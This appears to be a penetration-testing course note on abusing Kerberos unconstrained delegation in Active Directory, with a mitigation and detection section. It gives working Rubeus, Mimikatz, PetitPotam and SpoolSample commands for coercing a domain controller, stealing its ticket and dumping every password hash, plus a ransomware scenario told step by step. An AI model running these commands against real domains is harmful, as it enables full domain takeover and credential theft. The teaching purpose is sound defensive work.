---
tags: [active-directory, intermediate, privesc, vapt]
difficulty: intermediate
module: "69 - AD Access Controls and Escalation Basics"
topic: "69.14 Kerberos Unconstrained Delegation Basics"
---

# 14 - Kerberos Unconstrained Delegation Basics

## 1. Introduction to Unconstrained Delegation

Unconstrained Delegation is a legacy feature in Active Directory introduced in Windows 2000. It was designed to solve the "double hop" problem, where a user authenticates to a front-end server, and that server needs to make a secondary connection to a back-end database on the user's behalf. 

When a server is configured with Unconstrained Delegation, it implies that Active Directory completely trusts this server to impersonate *any* user to *any* other service. 

Mechanically, when a user authenticates to a server configured with Unconstrained Delegation via Kerberos, the Domain Controller (KDC) attaches the user's **Ticket Granting Ticket (TGT)** inside the Service Ticket (TGS). The front-end server extracts this TGT and places it into its local Local Security Authority Subsystem Service (LSASS) memory. The server can then use this TGT to request service tickets for any other system in the domain on behalf of that user.

**The Fatal Flaw:** If an attacker compromises a server configured with Unconstrained Delegation, they gain access to the LSASS memory. They can then extract the TGTs of *anyone* who authenticates to that server. If a Domain Admin connects to the server, their TGT is left in memory, allowing the attacker to completely take over the domain.

## 2. ASCII Diagram: Unconstrained Delegation Abuse Flow

```text
  Privileged User               Compromised Server                  Domain Controller (KDC)
  (e.g., Domain Admin)          (Unconstrained Del)                 (Active Directory)
  +------------------+          +------------------+                +---------------------+
  |                  |          |                  |                |                     |
  | 1. DA connects   |          |                  |                |                     |
  |    to server     |          |                  |                |                     |
  +----------------> |          |                  |                |                     |
  |                  |          |                  |                |                     |
  | 2. KDC sends DA's|          |                  |                |                     |
  |    TGT inside ST | <------------------------------------------+ |                     |
  |                  |          |                  |                |                     |
  |                  |          | 3. Server caches |                |                     |
  |                  |          |    DA's TGT in   |                |                     |
  |                  |          |    LSASS memory  |                |                     |
  +------------------+          +--------+---------+                +---------------------+
                                         |
                                         |
                            +------------v---------------+
                            |                            |
                            | 4. Attacker extracts       |
                            |    TGT using Mimikatz      |
                            |    or Rubeus               |
                            |                            |
                            +------------+---------------+
                                         |
                                         v
                            +----------------------------+
                            |                            |
                            | 5. Pass-the-Ticket (PtT):  |
                            |    Attacker uses DA's TGT  |
                            |    to authenticate to AD   |
                            |    as Domain Admin!        |
                            +----------------------------+
```

## 3. Enumerating Unconstrained Delegation

Finding machines configured with Unconstrained Delegation is trivial because it is explicitly stored as a userAccountControl flag (`TRUSTED_FOR_DELEGATION`) in Active Directory.

### Using PowerView
```powershell
# Identify Computer Objects with Unconstrained Delegation (Excluding Domain Controllers)
Get-DomainComputer -Unconstrained | Where-Object {$_.useraccountcontrol -notmatch "SERVER_TRUST_ACCOUNT"} | Select-Object samaccountname, dnshostname
```

### Using BloodHound
BloodHound automatically identifies this risk. Look for nodes with the `UnconstrainedDelegation` property set to `true`. This often yields a list of heavily trusted legacy servers.

## 4. Exploitation Methodology

The standard exploitation path relies on two steps:
1. Compromise the server configured with Unconstrained Delegation (must have local Administrator or SYSTEM access to dump LSASS).
2. Coerce or wait for a privileged user to authenticate to the compromised server.

### 4.1. Coercing Authentication (The Printer Bug / PetitPotam)
Instead of waiting passively for a Domain Admin to log in, attackers actively coerce high-value targets (like Domain Controllers) to authenticate to the compromised server. 

**The Printer Bug (SpoolSample):**
By abusing the MS-RPRN protocol (Print Spooler), an attacker can force a Domain Controller to authenticate to the compromised server.
```bash
# Force DC01 to authenticate to our compromised server (SRV01)
python3 printerbug.py domain.local/user:password@DC01 SRV01
```

**PetitPotam:**
An alternative coercion technique abusing the MS-EFSRPC protocol.
```bash
# Force DC01 to authenticate to SRV01
python3 PetitPotam.py SRV01 DC01
```

When the Domain Controller authenticates to `SRV01` (which has Unconstrained Delegation), it leaves its Machine Account TGT (`DC01$`) in the LSASS memory of `SRV01`.

### 4.2. Extracting and Using the TGT

Once coercion is successful, the attacker extracts the TGT from the compromised machine.

**Using Rubeus (Windows):**
```powershell
# Continuously monitor for incoming TGTs every 5 seconds
Rubeus.exe monitor /interval:5

# Once the TGT for the DC or DA is captured, inject it into the current session
Rubeus.exe ptt /ticket:<base64_blob_or_file.kirbi>
```

**Using Mimikatz (Windows):**
```text
privilege::debug
sekurlsa::tickets /export

# Mimikatz drops all Kerberos tickets into the current directory as .kirbi files.
# Locate the TGT for the target account, then inject:
kerberos::ptt "[0;12345]-2-0-40e10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi"
```

Once the ticket is injected, the attacker possesses the privileges of the victim account (e.g., DCSync rights if the victim was a Domain Controller computer account).

## 5. Defending and Detecting Unconstrained Delegation Abuse

### 5.1. Mitigation
- **Disable Unconstrained Delegation**: There is rarely a legitimate modern use case for this feature. Organizations should identify these servers and migrate them to Resource-Based Constrained Delegation (RBCD) or Constrained Delegation (KCD).
- **Protected Users Group**: Place all highly privileged accounts (Domain Admins, Enterprise Admins) into the Active Directory `Protected Users` group. Accounts in this group do not use NTLM, and their TGTs cannot be delegated.
- **"Account is sensitive and cannot be delegated"**: Enabling this flag on specific user accounts prevents their TGTs from being sent to servers configured for delegation.
- **Print Spooler Disablement**: Disable the Print Spooler service on all Domain Controllers and critical servers to neutralize the "Printer Bug" coercion technique.

### 5.2. Detection
- **Event ID 4769 (Kerberos Service Ticket Requested)**: Monitor for tickets where the `Ticket Options` flag indicates a forwardable ticket was requested.
- **SIEM Analysis**: Detect abnormal authentication patterns, such as a Domain Controller authenticating to a random member server (indicative of MS-RPRN coercion).
- **Egress Monitoring**: Monitor servers with Unconstrained Delegation. If they suddenly initiate administrative connections to the Domain Controller (e.g., DCSync via RPC), trigger a critical alert.

## Real-World Attack Scenario

A ransomware affiliate breached a hospital network and gained local administrator access to an old application server (`APP-LEGACY-02`). During AD enumeration using BloodHound, they discovered this legacy server was configured with Kerberos Unconstrained Delegation (`TRUSTED_FOR_DELEGATION`). 

The attacker knew that if they could get a Domain Administrator to log into this server, the DA's Ticket Granting Ticket (TGT) would be cached in the server's memory. Instead of waiting, they decided to force the Domain Controller itself to authenticate.

**The Execution:**
1. The attacker verified that the MS-RPRN (Print Spooler) service was running on the primary Domain Controller (`DC-PRI-01`).
2. Operating from their compromised server (`APP-LEGACY-02`), the attacker ran `Rubeus.exe` in monitoring mode to catch incoming Kerberos tickets:
   `Rubeus.exe monitor /interval:3`
3. Simultaneously, they used the `SpoolSample` tool (implementing the "Printer Bug") to coerce the Domain Controller into authenticating to the compromised application server:
   `SpoolSample.exe DC-PRI-01 APP-LEGACY-02`
4. The Domain Controller, tricked by the RPC call, authenticated to `APP-LEGACY-02`. Because the server had Unconstrained Delegation, the DC sent its own machine account TGT (`DC-PRI-01$`) inside the service ticket.
5. Rubeus instantly captured the incoming base64-encoded TGT for the Domain Controller.

**The Outcome:**
The attacker immediately injected the captured TGT into their current session using `Rubeus.exe ptt`. Because they were now operating as the Domain Controller itself, they had the highest possible privileges in the domain. They executed a DCSync attack using Mimikatz (`lsadump::dcsync /domain:domain.local /all /csv`), silently downloading every password hash in the Active Directory database, including the `krbtgt` account, enabling them to create Golden Tickets and achieving total, irreversible domain compromise.

## 6. Chaining Opportunities

Unconstrained delegation is heavily reliant on coercion techniques.
- Combine this with **SpoolSample**, **PetitPotam**, or **Coercer** to force Domain Controllers to authenticate to your compromised machine.
- Once the DC's machine account TGT is obtained via Unconstrained Delegation, it can be chained directly into a **DCSync** attack to dump all AD hashes.
- Can be used alongside [[11 - Bypassing UAC User Account Control]] to obtain the necessary SYSTEM privileges on the member server required to run Mimikatz or Rubeus.

## 7. Related Notes
- [[11 - Bypassing UAC User Account Control]]
- [[12 - Exploiting LAPS Local Administrator Password Solution Basics]]
- [[13 - Kerberos Constrained Delegation Basics]]
- [[15 - Defending Against Basic AD Attacks]]
- [[06 - Active Directory Authentication Coercion]]
- [[05 - Post-Exploitation Credential Dumping]]
